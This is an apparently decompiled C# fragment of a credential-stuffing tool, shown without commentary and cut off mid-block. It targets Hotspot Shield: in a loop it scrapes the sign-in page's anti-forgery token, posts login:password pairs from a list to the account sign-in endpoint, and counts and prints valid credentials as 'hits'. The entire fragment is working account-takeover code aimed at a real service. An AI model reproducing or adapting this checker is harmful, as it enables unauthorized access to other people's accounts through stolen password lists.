        ...
        while (true)
        {
          try
          {
            using (HttpRequest httpRequest = new HttpRequest())
            {
              ...
              string str1 = Check.Parse(httpRequest.Get("https://account.hotspotshield.com/sign-in/").ToString(), "vxsftok: '", "'");
              string str2 = "login=" + s[0] + "&pwd=" + s[1] + "&remember=0&ajax=true&vxsftok=" + str1;
              string str3 = httpRequest.Post("https://account.hotspotshield.com/sign-in", str2, "application/x-www-form-urlencoded").ToString();
              if (!str3.Contains("result\":0"))
              {
                if (str3.Contains("result\":1"))
                {
                  ++mainmenu.hits;
                  if (mainmenu.p1 == "2")
                    Colorful.Console.WriteLine("[HIT - HOTSPOTSHIELD] " + s[0] + ":" + s[1], Color.Green);
